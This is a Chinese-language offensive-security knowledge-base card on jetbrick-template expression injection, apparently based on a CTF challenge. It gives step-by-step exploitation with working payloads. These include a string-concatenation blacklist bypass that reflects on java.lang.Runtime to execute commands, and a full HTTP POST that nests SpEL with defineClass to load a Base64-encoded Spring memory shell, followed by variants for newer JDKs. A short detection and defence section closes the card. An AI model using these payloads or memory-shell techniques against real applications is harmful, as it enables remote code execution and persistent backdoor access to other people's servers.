---
id: web-java-expression-jetbrick-template-class-static-injection-rce
title: jetbrick-template 表达式注入：Class::method 反射 + 字符串拼接绕黑名单加载内存马
type: scenario
domain: web
path: web/java/expression
technique: jetbrick-template-class-static-reflection-bypass
tags:
- java
- jetbrick
- expression-injection
- template-engine
- reflection
- blacklist-bypass
- memshell
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V273
  verified_at: '2026-11-07T23:13:10+08:00'
  notes: 已对照原文核对：IndexController 黑名单、jetbrick Class::method 语法、ReflectUtil 反射 Runtime 弹计算器 payload 与截图、ClassLoader.defineClass 反射内存马、以及图中嵌套 SpEL+ReflectUtils.defineClass 的 POST str 均一致；/ ?cmd=whoami 回显截图确认内存马生效。未验证点：原文为 Java 8 环境，Java 9+ 模块限制下 defineClass 反射可行性未验证（卡内已注明替代方案）。
url: /docs/web/java/expression/web-java-expression-jetbrick-template-class-static-injection-rce/
draft: false
kb_aliases:
- jetbrick-template 注入
- JetEngine createTemplate
- Class::method 静态调用
- sun.reflect.misc.ReflectUtil
- 蓝桥杯 ezjava
- 字符串拼接绕黑名单
- 嵌套 SpEL 内存马
---

## 一句话结论

当用户输入被 `JetEngine.create().createTemplate(str)` 当作 jetbrick-template 模板渲染时，模板语言支持 `${...}`、`#set(var=expr)` 与 `Class::method(...)` 静态调用；用 `sun.reflect.misc.ReflectUtil::forName('java.lang.Run'+'time')` 拼接关键字绕过黑名单，再反射取构造器/方法、`setAccessible`、`invoke` 即可执行命令；也可在外层模板中再构造 SpEL 解析器，用 `T(...ReflectUtils).defineClass(...)` 加载 Base64 字节码内存马。

## 原理

- **模板即代码**：`JetTemplate.render(map, out)` 会解析模板中的表达式与指令。jetbrick-template 支持 `${expr}` 输出、`#set(var = expr)` 赋值（可带类型声明，如 `#set(java.lang.reflect.Method m = ...)`）、`Class::Field` 静态字段与 `Class::method(args)` 静态方法调用，默认不限制可访问类。
- **黑名单只做字面量匹配**：示例代码拒绝包含 `new`、`spring`、`Class`、`UNIXProcess`、`ProcessBuilder`、`Runtime` 的模板串。但模板支持字符串拼接：`'java.lang.Run'+'time'` 在运行时拼成 `java.lang.Runtime`，源码中没有连续 `Runtime` 子串，黑名单被绕过；`'Clas'+'sLoader'`、`'spr'+'ing'` 同理。
- **反射链**：`sun.reflect.misc.ReflectUtil::forName(name)` 返回 Class；`.getMethod('exec', String::class)` 取方法；`.getDeclaredConstructor()` 取私有构造器；`cons.setAccessible(true)` 后 `cons.newInstance()` 得到 Runtime 实例；最后 `exec.invoke(runtime, 'calc.exe')` 执行命令。
- **内存马**：无外网时可用 `ClassLoader.defineClass(name, bytes, off, len)`（Java 8 的 protected 方法，反射 `setAccessible(true)`）把 Base64 解码后的字节码定义到当前线程上下文类加载器；再反射 `Class.newInstance()` 触发类初始化，注册 Spring Controller/Interceptor 内存马。
- **嵌套引擎**：外层 jetbrick 模板可调用 `jetbrick.template.JetEngine::create().createTemplate("${ne"+"w org.spr"+"ingframework.expression.spel.standard.SpelExpressionParser().parseExpression('T(org.spr'+'ingframework.cglib.core.ReflectUtils).defineClass(...)').getValue()}")`，把真正的 SpEL 表达式藏在内层模板中，关键字被拆分，外层黑名单看不到；内层 SpEL 再执行 `T()` 与 `defineClass`。
- **为什么成立**：模板引擎把输入当代码执行，黑名单不是安全边界；`::` 静态调用和反射提供了“任意类、任意方法”的能力；字符串拼接/嵌套引擎只改变源码字面量，不改变运行时语义。

## 触发条件

- 应用把用户可控字符串直接传给 jetbrick-template 的 `createTemplate`/`render`（或同类“字符串模板”接口）。
- 模板引擎未启用类白名单/沙箱/安全解析器，classpath 中存在可利用类（JDK、Spring、CGLIB 等）。
- 黑名单只检查关键字字面量，未做语法/AST 级限制。
- 目标可出网（可直接 `Runtime.exec` 反弹）或不出网（用 defineClass 加载本地 Base64 内存马）。

## 利用步骤

1. 确认模板注入：提交 `${7*7}`、`${Long::MAX_VALUE}` 或 `#set(x=1)${x}`，观察是否被求值。
2. 测试静态调用：`${java.lang.Long::valueOf("123")}`、`${Collections::emptyList()}`。
3. 反射执行命令：
   - `#set(exec=sun.reflect.misc.ReflectUtil::forName('java.lang.Run'+'time').getMethod('exec',String::class))`
   - `#set(cons=sun.reflect.misc.ReflectUtil::forName('java.lang.Run'+'time').getDeclaredConstructor())`
   - `${cons.setAccessible(true)}`
   - `#set(runtime=cons.newInstance())`
   - `${exec.invoke(runtime,'calc.exe')}`
4. 不出网内存马：编译继承 Spring Controller/Interceptor 的恶意类，Base64 编码；用反射取 `ClassLoader.defineClass`，以当前线程上下文类加载器定义类，反射 `newInstance()` 触发注册；随后访问对应路由执行命令。
5. 若黑名单同时拦截 `ReflectUtil`/`defineClass`，改用嵌套 SpEL：外层模板拼接 `ne`+`w ... SpelExpressionParser`，内层用 `T(...)` 调用 `ReflectUtils.defineClass`；或换用 `Class::forName`、`getDeclaredMethod` 等未列名反射入口。
6. 验证命令回显/内存马路由（如 `GET /?cmd=whoami` 返回命令输出）。

## PoC

```text
# 计算器
#set(exec=sun.reflect.misc.ReflectUtil::forName('java.lang.Run'+'time').getMethod('exec',String::class))
#set(cons=sun.reflect.misc.ReflectUtil::forName('java.lang.Run'+'time').getDeclaredConstructor())
${cons.setAccessible(true)}
#set(runtime=cons.newInstance())
${exec.invoke(runtime,'calc.exe')}
```

```text
# 嵌套 SpEL + defineClass 内存马（片段）
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded

str=${jetbrick.template.JetEngine::create().createTemplate("${ne"+"w org.spr"+"ingframework.expression.spel.standard.SpelExpressionParser().parseExpression('T(org.spr'+'ingframework.cglib.core.ReflectUtils).defineClass(\'InceptorMemShell\',T(org.spr'+'ingframework.util.Base64Utils).decodeFromString(\'<base64 class>\'),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()').getValue()}")}
```

```text
# 成功后内存马路由：
GET /?cmd=whoami HTTP/1.1
# 返回命令输出（案例中为 whoami 结果）
```

## 变体与关联

- **引擎变体**：FreeMarker（`?new Execute`）、Velocity、Thymeleaf、Aviator（见 JimuReport 卡）、SpEL/OGNL/EL（见既有卡）；语法不同，但“用户输入当模板 + 未沙箱”是同一根因。
- **黑名单绕过变体**：字符串拼接、Unicode/URL 编码、`Class::forName` 拆分、嵌套另一个表达式引擎、反射 `MethodHandles`/`Unsafe`；黑名单越依赖字面量越容易绕过。
- **内存马变体**：Spring Controller/Interceptor、Tomcat Filter/Listener、`defineClass` 到上下文类加载器；Java 9+ 需注意 `ClassLoader#defineClass` 签名与模块访问限制，可用 `MethodHandles.privateLookupIn`/`Unsafe.defineAnonymousClass` 等替代。
- **关联卡片**：[[web-java-expression-spel-t()]] 类 SpEL 注入卡、[[web-java-expression-ognl-high-version-reflection-invoke-bypass]]（反射 + Method.invoke 绕黑名单）、[[web-java-expression-el-injection-waf-bypass-scanner-echo]]（EL WAF 绕过）、[[web-java-component-jimureport-save-cell-expression-injection-rce]]（Aviator/FreeMarker 单元格注入）。
- **边界**：模板引擎启用类白名单/沙箱、模板源不可控、黑名单做 AST 级检查、或 JDK 模块系统禁止反射访问 `ClassLoader.defineClass` 时，对应 payload 失效。

## 检测与防御

- **根因修复**：不要把用户输入当作模板源码；需要动态模板时使用逻辑-less 模板/预定义模板 + 数据绑定，或启用引擎的沙箱与类白名单（jetbrick 可限制可访问类）。
- **黑名单不可靠**：禁止用关键字黑名单作为安全边界；至少对模板做 AST 解析，拒绝静态方法调用、`#set` 类型声明、反射类/方法名、字符串拼接构造的敏感类名。
- **检测信号**：请求参数中出现 `${`、`#set(`、`::`、`ReflectUtil`、`getDeclaredMethod`、`defineClass`、`Base64Utils`、`Runtime` 拼接片段；模板渲染后进程拉起 `calc`/`sh`/`cmd`；应用出现异常路由或内存马特征。
- **加固**：模板服务最小权限运行，限制文件/网络访问；升级引擎并启用安全配置；对模板接口做鉴权与输入长度/字符集限制；部署 RASP/字节码完整性监控。
